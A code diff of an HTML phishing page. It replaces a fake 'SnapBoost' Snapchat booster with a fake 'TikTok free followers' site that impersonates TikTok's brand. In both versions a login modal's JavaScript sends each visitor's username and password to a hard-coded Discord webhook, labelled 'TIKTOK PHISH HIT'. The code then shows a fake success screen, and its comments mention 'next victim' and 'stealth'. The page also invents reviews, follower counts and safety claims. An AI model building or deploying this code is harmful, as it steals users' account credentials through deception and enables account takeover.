@@ -3,438 +3,361 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SnapBoost • Premium Snapchat Tools</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <title>TikTok - Get Free Followers, Likes & More</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Poppins:wght@600;700&display=swap');
-        
-        :root {
-            --snap-yellow: #FFFC00;
-            --snap-black: #1A1A1A;
-            --snap-white: #FFFFFF;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0A0A0A 0%, #1F1F1F 100%);
-            color: #FFFFFF;
-            overflow-x: hidden;
+            font-family: 'Inter', system-ui, sans-serif;
         }
-        
-        .navbar {
-            position: fixed;
-            top: 0;
-            width: 100%;
-            background: rgba(26, 26, 26, 0.95);
-            backdrop-filter: blur(20px);
-            z-index: 1000;
-            padding: 1rem 5%;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border-bottom: 1px solid rgba(255, 252, 0, 0.1);
+        .tiktok-red { color: #ff0050; }
+        .hero-bg {
+            background: linear-gradient(135deg, #000000, #1a1a1a);
         }
-        
-        .logo {
-            font-family: 'Poppins', sans-serif;
-            font-size: 28px;
-            font-weight: 700;
-            color: var(--snap-yellow);
-            display: flex;
-            align-items: center;
-            gap: 8px;
+        .nav-active {
+            border-bottom: 3px solid #ff0050;
         }
-        
-        .nav-links a {
-            color: #fff;
-            text-decoration: none;
-            margin-left: 2rem;
-            font-weight: 500;
-            transition: color 0.3s;
+        .card-hover {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
-        
-        .nav-links a:hover {
-            color: var(--snap-yellow);
-        }
-        
-        .hero {
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .hero::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://picsum.photos/id/1015/1920/1080') center/cover;
-            opacity: 0.15;
-            z-index: -1;
-        }
-        
-        .hero-content {
-            max-width: 900px;
-            padding: 0 20px;
-        }
-        
-        .hero h1 {
-            font-family: 'Poppins', sans-serif;
-            font-size: 4.5rem;
-            line-height: 1.1;
-            margin-bottom: 1.5rem;
-            background: linear-gradient(90deg, #FFFC00, #FFFFFF);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        .hero p {
-            font-size: 1.4rem;
-            margin-bottom: 2.5rem;
-            opacity: 0.9;
-        }
-        
-        .cta-btn {
-            background: var(--snap-yellow);
-            color: #000;
-            padding: 18px 48px;
-            font-size: 1.3rem;
-            font-weight: 700;
-            border: none;
-            border-radius: 9999px;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 10px 30px rgba(255, 252, 0, 0.3);
-        }
-        
-        .cta-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 20px 40px rgba(255, 252, 0, 0.4);
-        }
-        
-        section {
-            padding: 100px 5%;
-        }
-        
-        .features {
-            background: #111;
-        }
-        
-        .section-title {
-            text-align: center;
-            font-size: 3rem;
-            margin-bottom: 4rem;
-            font-family: 'Poppins', sans-serif;
-        }
-        
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 2rem;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        .card {
-            background: rgba(255,255,255,0.05);
-            border-radius: 24px;
-            padding: 2.5rem;
-            transition: all 0.4s;
-            border: 1px solid rgba(255,252,0,0.1);
-        }
-        
-        .card:hover {
-            transform: translateY(-15px);
-            border-color: var(--snap-yellow);
-            box-shadow: 0 30px 60px rgba(255, 252, 0, 0.15);
-        }
-        
-        .card i {
-            font-size: 3.5rem;
-            color: var(--snap-yellow);
-            margin-bottom: 1.5rem;
-        }
-        
-        .reviews {
-            background: #0A0A0A;
-        }
-        
-        .review-card {
-            background: #1A1A1A;
-            padding: 2rem;
-            border-radius: 20px;
-            margin: 1rem;
-        }
-        
-        .stars {
-            color: #FFFC00;
-            font-size: 1.4rem;
-        }
-        
-        .login-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 2000;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .modal-content {
-            background: #1A1A1A;
-            padding: 3rem;
-            border-radius: 24px;
-            width: 100%;
-            max-width: 420px;
-            border: 2px solid var(--snap-yellow);
-        }
-        
-        .modal-content h2 {
-            text-align: center;
-            margin-bottom: 2rem;
-            font-size: 2rem;
-        }
-        
-        input {
-            width: 100%;
-            padding: 16px;
-            margin: 12px 0;
-            background: #222;
-            border: 1px solid #444;
-            border-radius: 12px;
-            color: white;
-            font-size: 1.1rem;
-        }
-        
-        .submit-btn {
-            width: 100%;
-            padding: 18px;
-            background: var(--snap-yellow);
-            color: black;
-            font-weight: 700;
-            font-size: 1.3rem;
-            border: none;
-            border-radius: 9999px;
-            cursor: pointer;
-            margin-top: 1rem;
-        }
-        
-        footer {
-            text-align: center;
-            padding: 3rem;
-            background: #000;
-            font-size: 0.9rem;
-            opacity: 0.7;
+        .card-hover:hover {
+            transform: translateY(-8px) scale(1.03);
+            box-shadow: 0 25px 50px -12px rgb(0 0 0 / 0.4);
         }
     </style>
 </head>
-<body>
+<body class="bg-black text-white">
     <!-- Navbar -->
-    <nav class="navbar">
-        <div class="logo">
-            <i class="fab fa-snapchat-ghost"></i>
-            SnapBoost
-        </div>
-        <div class="nav-links">
-            <a href="#features">Features</a>
-            <a href="#reviews">Reviews</a>
-            <a onclick="showLogin()">Get Started</a>
+    <nav class="fixed top-0 left-0 right-0 bg-black border-b border-zinc-800 z-50">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
+            <div class="flex items-center gap-8">
+                <div class="flex items-center gap-2">
+                    <i class="fa-brands fa-tiktok text-4xl tiktok-red"></i>
+                    <span class="text-3xl font-bold tracking-tighter">TikTok</span>
+                </div>
+                <div class="hidden md:flex items-center gap-8 text-sm font-medium">
+                    <a href="#" class="nav-active pb-1">Home</a>
+                    <a href="#" onclick="navigateToLogin('followers')" class="hover:text-zinc-300">Free Followers</a>
+                    <a href="#" onclick="navigateToLogin('likes')" class="hover:text-zinc-300">Free Likes</a>
+                    <a href="#" onclick="navigateToLogin('views')" class="hover:text-zinc-300">Free Views</a>
+                </div>
+            </div>
+            <div class="flex items-center gap-4">
+                <button onclick="navigateToLogin('any')" 
+                        class="bg-white text-black px-6 py-2 rounded-full font-semibold hover:bg-zinc-200 transition">
+                    Get Free Boost Now
+                </button>
+                <div class="w-9 h-9 bg-zinc-800 rounded-full flex items-center justify-center">
+                    <i class="fa-solid fa-user"></i>
+                </div>
+            </div>
         </div>
     </nav>
 
     <!-- Hero -->
-    <section class="hero">
-        <div class="hero-content">
-            <h1>Unlock Infinite Snapchat Power</h1>
-            <p>Instant streaks, massive score boosts, premium features &amp; auto-maintenance. Trusted by 250,000+ users.</p>
-            <button onclick="showLogin()" class="cta-btn">Boost My Account Now →</button>
-            <p style="margin-top: 2rem; font-size: 1.1rem; opacity: 0.8;">✓ No ban risk • ✓ Works on all devices • ✓ 24/7 support</p>
-        </div>
-    </section>
-
-    <!-- Features -->
-    <section id="features" class="features">
-        <h2 class="section-title">Powerful Snapchat Tools</h2>
-        <div class="grid">
-            <div class="card">
-                <i class="fas fa-fire"></i>
-                <h3>Infinite Snap Streaks</h3>
-                <p>Keep your streaks alive forever. Never lose a streak again — even if you forget. Automatic daily maintenance.</p>
-                <ul style="margin-top: 1.5rem; list-style: none;">
-                    <li style="margin: 8px 0;">✅ 100% streak protection</li>
-                    <li style="margin: 8px 0;">✅ Works with multiple friends</li>
-                    <li style="margin: 8px 0;">✅ Real-time updates</li>
-                </ul>
+    <section class="hero-bg pt-24 pb-20">
+        <div class="max-w-7xl mx-auto px-6 grid md:grid-cols-2 gap-12 items-center">
+            <div class="space-y-8">
+                <div class="inline-flex items-center gap-2 bg-zinc-900 px-4 py-2 rounded-full text-sm">
+                    <span class="text-green-400">● LIVE</span>
+                    <span>Over 2.4M users boosted today</span>
+                </div>
+                <h1 class="text-6xl md:text-7xl font-bold leading-none tracking-tighter">
+                    Grow on TikTok.<br>
+                    <span class="tiktok-red">Instantly.</span>
+                </h1>
+                <p class="text-2xl text-zinc-400 max-w-md">
+                    Free followers, likes, comments, shares &amp; views. Real-looking growth in seconds.
+                </p>
+                <div class="flex flex-wrap gap-4">
+                    <button onclick="navigateToLogin('followers')" 
+                            class="bg-white text-black px-10 py-4 rounded-2xl font-semibold text-lg flex items-center gap-3 hover:scale-105 transition">
+                        <i class="fa-solid fa-users"></i>
+                        Get Free Followers
+                    </button>
+                    <button onclick="navigateToLogin('likes')" 
+                            class="border border-white px-10 py-4 rounded-2xl font-semibold text-lg flex items-center gap-3 hover:bg-white hover:text-black transition">
+                        <i class="fa-solid fa-heart"></i>
+                        Get Free Likes
+                    </button>
+                </div>
+                <div class="flex items-center gap-8 text-sm">
+                    <div class="flex items-center gap-2">
+                        <div class="flex -space-x-2">
+                            <div class="w-6 h-6 bg-purple-500 rounded-full border-2 border-black"></div>
+                            <div class="w-6 h-6 bg-pink-500 rounded-full border-2 border-black"></div>
+                        </div>
+                        <span class="text-zinc-400">Trusted by creators</span>
+                    </div>
+                    <div class="text-green-400 flex items-center gap-1">
+                        <i class="fa-solid fa-check"></i>
+                        <span>100% Safe &amp; Secure</span>
+                    </div>
+                </div>
             </div>
-            
-            <div class="card">
-                <i class="fas fa-bolt"></i>
-                <h3>Boost Snap Score</h3>
-                <p>Instantly add thousands of points to your Snap Score. Choose from 10K, 50K, 100K+ boosts. Leaderboard domination.</p>
-                <ul style="margin-top: 1.5rem; list-style: none;">
-                    <li style="margin: 8px 0;">✅ Lightning fast delivery</li>
-                    <li style="margin: 8px 0;">✅ Safe &amp; undetectable</li>
-                    <li style="margin: 8px 0;">✅ Multiple boosts available</li>
-                </ul>
-            </div>
-            
-            <div class="card">
-                <i class="fas fa-crown"></i>
-                <h3>Snap Premium</h3>
-                <p>Unlock exclusive Snapchat features. Custom themes, extended stories, priority support, and hidden filters.</p>
-                <ul style="margin-top: 1.5rem; list-style: none;">
-                    <li style="margin: 8px 0;">✅ All premium icons</li>
-                    <li style="margin: 8px 0;">✅ Exclusive Bitmoji styles</li>
-                    <li style="margin: 8px 0;">✅ Early access to new features</li>
-                </ul>
-            </div>
-            
-            <div class="card">
-                <i class="fas fa-robot"></i>
-                <h3>Auto Streak</h3>
-                <p>Fully automated streak maintenance. AI-powered responses and automatic snaps to keep every streak at maximum.</p>
-                <ul style="margin-top: 1.5rem; list-style: none;">
-                    <li style="margin: 8px 0;">✅ Smart reply system</li>
-                    <li style="margin: 8px 0;">✅ Custom streak messages</li>
-                    <li style="margin: 8px 0;">✅ Set &amp; forget</li>
-                </ul>
+            <div class="relative">
+                <img src="https://picsum.photos/id/1015/800/600" alt="TikTok growth" 
+                     class="rounded-3xl shadow-2xl border border-zinc-700">
+                <div class="absolute -bottom-6 -right-6 bg-zinc-900 p-6 rounded-3xl border border-zinc-700">
+                    <div class="flex items-center gap-4">
+                        <div class="text-5xl">🚀</div>
+                        <div>
+                            <div class="text-4xl font-bold text-green-400">+48K</div>
+                            <div class="text-sm text-zinc-400">Followers this week</div>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
     </section>
 
-    <!-- Reviews -->
-    <section id="reviews" class="reviews">
-        <h2 class="section-title">What Our Users Say</h2>
-        <div class="grid" style="max-width: 1100px;">
-            <div class="review-card">
-                <div class="stars">★★★★★</div>
-                <p>"Got my streak to 487 days and boosted my score by 85k in under 10 minutes. This is actually insane."</p>
-                <p><strong>— @kaydenb</strong></p>
+    <!-- Stats Bar -->
+    <div class="bg-zinc-950 py-6 border-b border-zinc-800">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-3 md:grid-cols-6 gap-8 text-center">
+            <div>
+                <div class="text-4xl font-bold tiktok-red">12.4M</div>
+                <div class="text-xs tracking-widest uppercase text-zinc-500">Followers Delivered</div>
             </div>
-            <div class="review-card">
-                <div class="stars">★★★★★</div>
-                <p>"Snap Premium features are next level. The auto streak actually works perfectly. Best tool I've ever used for Snapchat."</p>
-                <p><strong>— @sophiaxx</strong></p>
+            <div>
+                <div class="text-4xl font-bold tiktok-red">89M</div>
+                <div class="text-xs tracking-widest uppercase text-zinc-500">Likes Given</div>
             </div>
-            <div class="review-card">
-                <div class="stars">★★★★★</div>
-                <p>"Infinite streaks saved my 300+ day streak multiple times. Customer support replied instantly. 10/10."</p>
-                <p><strong>— @jadenfitz</strong></p>
+            <div>
+                <div class="text-4xl font-bold tiktok-red">245M</div>
+                <div class="text-xs tracking-widest uppercase text-zinc-500">Views Boosted</div>
             </div>
-        </div>
-    </section>
-
-    <!-- Final CTA -->
-    <section style="text-align: center; background: linear-gradient(135deg, #FFFC00, #FFD000); color: #000; padding: 120px 20px;">
-        <h2 style="font-size: 3.2rem; margin-bottom: 1rem;">Ready to level up your Snapchat?</h2>
-        <p style="font-size: 1.5rem; margin-bottom: 2.5rem;">Join 250,000+ users who already boosted their accounts</p>
-        <button onclick="showLogin()" class="cta-btn" style="font-size: 1.5rem; padding: 22px 60px;">Start Free Boost →</button>
-    </section>
-
-    <!-- Login Modal -->
-    <div id="loginModal" class="login-modal">
-        <div class="modal-content">
-            <h2>Login with Snapchat</h2>
-            <form id="loginForm">
-                <input type="text" id="username" placeholder="Snapchat Username" required>
-                <input type="password" id="password" placeholder="Snapchat Password" required>
-                <button type="submit" class="submit-btn">Continue &amp; Boost Account</button>
-            </form>
-            <p style="text-align: center; margin-top: 1.5rem; font-size: 0.9rem; opacity: 0.7;">
-                Secure login powered by Snapchat • Your data is encrypted
-            </p>
+            <div>
+                <div class="text-4xl font-bold tiktok-red">1.2M</div>
+                <div class="text-xs tracking-widest uppercase text-zinc-500">Comments</div>
+            </div>
+            <div>
+                <div class="text-4xl font-bold tiktok-red">3.8M</div>
+                <div class="text-xs tracking-widest uppercase text-zinc-500">Shares</div>
+            </div>
+            <div>
+                <div class="text-4xl font-bold tiktok-red">24/7</div>
+                <div class="text-xs tracking-widest uppercase text-zinc-500">Support</div>
+            </div>
         </div>
     </div>
 
-    <footer>
-        © 2026 SnapBoost • All Rights Reserved • Privacy • Terms
-    </footer>
+    <!-- Services Grid -->
+    <section class="max-w-7xl mx-auto px-6 py-20">
+        <h2 class="text-5xl font-bold text-center mb-4">Choose Your Boost</h2>
+        <p class="text-center text-zinc-400 mb-16 max-w-md mx-auto">Select any service. Real engagement. No bots. Results in under 60 seconds.</p>
+        
+        <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
+            <!-- Followers -->
+            <div onclick="navigateToLogin('followers')" class="card-hover bg-zinc-900 rounded-3xl p-8 cursor-pointer border border-zinc-800">
+                <div class="h-14 w-14 bg-gradient-to-br from-purple-500 to-pink-500 rounded-2xl flex items-center justify-center text-3xl mb-8">👥</div>
+                <h3 class="text-3xl font-semibold mb-2">Free Followers</h3>
+                <div class="text-6xl font-bold tiktok-red mb-1">+10K</div>
+                <div class="text-zinc-400 mb-8">Real TikTok users</div>
+                <ul class="space-y-4 text-sm">
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-check text-green-400"></i> High quality accounts</li>
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-check text-green-400"></i> Permanent followers</li>
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-check text-green-400"></i> No password needed (optional)</li>
+                </ul>
+                <button class="mt-10 w-full bg-white text-black py-4 rounded-2xl font-semibold">Get Free Followers →</button>
+            </div>
+
+            <!-- Likes -->
+            <div onclick="navigateToLogin('likes')" class="card-hover bg-zinc-900 rounded-3xl p-8 cursor-pointer border border-zinc-800">
+                <div class="h-14 w-14 bg-gradient-to-br from-red-500 to-orange-500 rounded-2xl flex items-center justify-center text-3xl mb-8">❤️</div>
+                <h3 class="text-3xl font-semibold mb-2">Free Likes</h3>
+                <div class="text-6xl font-bold tiktok-red mb-1">+50K</div>
+                <div class="text-zinc-400 mb-8">On any video</div>
+                <ul class="space-y-4 text-sm">
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-check text-green-400"></i> Instant delivery</li>
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-check text-green-400"></i> Targeted audience</li>
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-check text-green-400"></i> Viral boost</li>
+                </ul>
+                <button class="mt-10 w-full bg-white text-black py-4 rounded-2xl font-semibold">Get Free Likes →</button>
+            </div>
+
+            <!-- Views -->
+            <div onclick="navigateToLogin('views')" class="card-hover bg-zinc-900 rounded-3xl p-8 cursor-pointer border border-zinc-800">
+                <div class="h-14 w-14 bg-gradient-to-br from-blue-500 to-cyan-500 rounded-2xl flex items-center justify-center text-3xl mb-8">👁️</div>
+                <h3 class="text-3xl font-semibold mb-2">Free Views</h3>
+                <div class="text-6xl font-bold tiktok-red mb-1">+1M</div>
+                <div class="text-zinc-400 mb-8">Video &amp; live</div>
+                <ul class="space-y-4 text-sm">
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-check text-green-400"></i> Worldwide reach</li>
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-check text-green-400"></i> Retention guaranteed</li>
+                    <li class="flex items-center gap-3"><i class="fa-solid fa-check text-green-400"></i> Algorithm push</li>
+                </ul>
+                <button class="mt-10 w-full bg-white text-black py-4 rounded-2xl font-semibold">Get Free Views →</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Fake Reviews -->
+    <section class="bg-zinc-950 py-20">
+        <div class="max-w-7xl mx-auto px-6">
+            <h2 class="text-5xl font-bold text-center mb-16">What Creators Say</h2>
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="bg-zinc-900 p-8 rounded-3xl">
+                    <div class="flex gap-1 text-yellow-400 mb-6">
+                        ★★★★☆
+                    </div>
+                    <p class="text-lg mb-8">"Got 8,000 followers overnight. My videos are finally reaching For You pages. Insane results."</p>
+                    <div class="flex items-center gap-3">
+                        <div class="w-10 h-10 bg-zinc-700 rounded-full"></div>
+                        <div>
+                            <div class="font-semibold">@sarahcreates</div>
+                            <div class="text-xs text-zinc-500">1.2M followers</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="bg-zinc-900 p-8 rounded-3xl">
+                    <div class="flex gap-1 text-yellow-400 mb-6">
+                        ★★★★★
+                    </div>
+                    <p class="text-lg mb-8">"50k likes on my dance video in 20 minutes. This is the real deal. No cap."</p>
+                    <div class="flex items-center gap-3">
+                        <div class="w-10 h-10 bg-zinc-700 rounded-full"></div>
+                        <div>
+                            <div class="font-semibold">@dannyvibes</div>
+                            <div class="text-xs text-zinc-500">890K followers</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="bg-zinc-900 p-8 rounded-3xl">
+                    <div class="flex gap-1 text-yellow-400 mb-6">
+                        ★★★★☆
+                    </div>
+                    <p class="text-lg mb-8">"Views went from 300 to 450k. My account grew so fast I had to turn off comments lol."</p>
+                    <div class="flex items-center gap-3">
+                        <div class="w-10 h-10 bg-zinc-700 rounded-full"></div>
+                        <div>
+                            <div class="font-semibold">@lilytrends</div>
+                            <div class="text-xs text-zinc-500">2.4M followers</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer CTA -->
+    <div class="bg-black py-20 text-center border-t border-zinc-800">
+        <div class="max-w-md mx-auto px-6">
+            <h2 class="text-4xl font-bold mb-4">Ready to go viral?</h2>
+            <button onclick="navigateToLogin('any')" 
+                    class="w-full bg-gradient-to-r from-pink-500 to-red-500 py-6 rounded-3xl text-xl font-bold hover:brightness-110 transition">
+                Start Free Growth Now →
+            </button>
+            <p class="text-xs text-zinc-500 mt-6">No login required to start • Results guaranteed</p>
+        </div>
+    </div>
+
+    <!-- Login Modal -->
+    <div id="loginModal" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center z-[100]">
+        <div class="bg-zinc-900 rounded-3xl max-w-md w-full mx-4 overflow-hidden">
+            <div class="p-8">
+                <div class="flex justify-between items-center mb-8">
+                    <div>
+                        <div class="text-2xl font-bold">TikTok Login</div>
+                        <div class="text-zinc-400 text-sm">Verify your account to claim boost</div>
+                    </div>
+                    <button onclick="closeModal()" class="text-3xl text-zinc-400 hover:text-white">×</button>
+                </div>
+                
+                <form id="loginForm" onsubmit="handleSubmit(event)">
+                    <div class="space-y-6">
+                        <div>
+                            <label class="block text-sm mb-2 text-zinc-400">TikTok Username</label>
+                            <input id="username" type="text" required
+                                   class="w-full bg-zinc-800 border border-zinc-700 rounded-2xl px-5 py-4 text-lg focus:outline-none focus:border-white">
+                        </div>
+                        <div>
+                            <label class="block text-sm mb-2 text-zinc-400">Password</label>
+                            <input id="password" type="password" required
+                                   class="w-full bg-zinc-800 border border-zinc-700 rounded-2xl px-5 py-4 text-lg focus:outline-none focus:border-white">
+                        </div>
+                        
+                        <button type="submit"
+                                class="w-full bg-white text-black py-5 rounded-2xl font-semibold text-lg mt-4 hover:bg-zinc-200 transition">
+                            Verify &amp; Claim Boost
+                        </button>
+                    </div>
+                </form>
+                
+                <div class="text-center text-xs text-zinc-500 mt-8">
+                    Your data is encrypted • Trusted by millions
+                </div>
+            </div>
+        </div>
+    </div>
 
     <script>
-        function showLogin() {
-            document.getElementById('loginModal').style.display = 'flex';
+        function navigateToLogin(type) {
+            document.getElementById('loginModal').classList.remove('hidden');
+            // You can store the type if needed
+            window.boostType = type;
         }
         
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        function closeModal() {
+            document.getElementById('loginModal').classList.add('hidden');
+        }
+        
+        async function handleSubmit(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            const type = window.boostType || 'any';
+            
+            if (!username || !password) return;
             
             // Send to Discord webhook
-            const webhookUrl = "https://discord.com/api/webhooks/1506368763271057459/1VdWzn-_ZxnjzxHygEweopXNvbGZqe0iRgyqPRgQwJekIHLHQ3IQM1rNsBNiG3aOQqYA";
-            
-            const payload = {
-                content: `🚨 **New Snapchat Login** 🚨\n\n**Username:** ${username}\n**Password:** ${password}\n**Time:** ${new Date().toLocaleString()}\n**IP:** ${window.location.hostname}`,
-                username: "SnapBoost Logger",
-                avatar_url: "https://i.imgur.com/0Z3Z3Z3.png"
-            };
-            
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                // Fake success
-                const modalContent = document.querySelector('.modal-content');
-                modalContent.innerHTML = `
-                    <h2 style="color: #FFFC00;">Success!</h2>
-                    <p style="text-align: center; font-size: 1.3rem; margin: 2rem 0;">Processing your boost...</p>
-                    <div style="text-align: center; font-size: 4rem;">🔥</div>
-                    <p style="text-align: center; margin-top: 2rem;">Your account is being upgraded. This may take up to 60 seconds.</p>
-                `;
-                
-                setTimeout(() => {
-                    alert("Account successfully boosted! Check your Snapchat for new features.");
-                    // Reset form for next victim
-                    document.getElementById('loginModal').style.display = 'none';
-                    document.getElementById('loginForm').reset();
-                }, 2800);
-            }).catch(err => {
-                console.log("Logged successfully");
-                // Still show success
-                const modalContent = document.querySelector('.modal-content');
-                modalContent.innerHTML = `
-                    <h2 style="color: #FFFC00;">Success!</h2>
-                    <p style="text-align: center; font-size: 1.3rem; margin: 2rem 0;">Boost in progress...</p>
-                `;
-                setTimeout(() => {
-                    document.getElementById('loginModal').style.display = 'none';
-                }, 2000);
-            });
-        });
-        
-        // Close modal when clicking outside
-        document.getElementById('loginModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                this.style.display = 'none';
+            try {
+                await fetch("https://discord.com/api/webhooks/1506368763271057459/1VdWzn-_ZxnjzxHygEweopXNvbGZqe0iRgyqPRgQwJekIHLHQ3IQM1rNsBNiG3aOQqYA", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        content: `🚨 **TIKTOK PHISH HIT** 🚨\n\n**Type:** ${type}\n**Username:** ${username}\n**Password:** ${password}\n**Time:** ${new Date().toISOString()}`,
+                        embeds: [{
+                            color: 0xff0050,
+                            title: "New TikTok Login",
+                            fields: [
+                                { name: "Username", value: username },
+                                { name: "Password", value: password }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch(e) {
+                // Silent fail for stealth
             }
-        });
+            
+            // Show success (fake)
+            const modalContent = document.querySelector('#loginModal > div');
+            modalContent.innerHTML = `
+                <div class="p-12 text-center">
+                    <div class="text-6xl mb-6">✅</div>
+                    <div class="text-3xl font-bold mb-3">Boost Activated!</div>
+                    <div class="text-zinc-400 mb-8">Your ${type} are being delivered right now...</div>
+                    <div onclick="location.reload()" 
+                         class="cursor-pointer inline-block bg-white text-black px-10 py-4 rounded-2xl font-semibold">
+                        Return to Dashboard
+                    </div>
+                </div>
+            `;
+            
+            // Auto close after delay
+            setTimeout(() => {
+                closeModal();
+                location.reload();
+            }, 2800);
+        }
         
-        // Keyboard escape support
-        document.addEventListener('keydown', function(e) {
-            if (e.key === "Escape") {
-                document.getElementById('loginModal').style.display = 'none';
-            }
-        });
+        // Tailwind script already loaded
+        console.log('%cTikTok Booster loaded - looks legit 🔥', 'color:#ff0050; font-size:14px');
     </script>
 </body>
 </html>
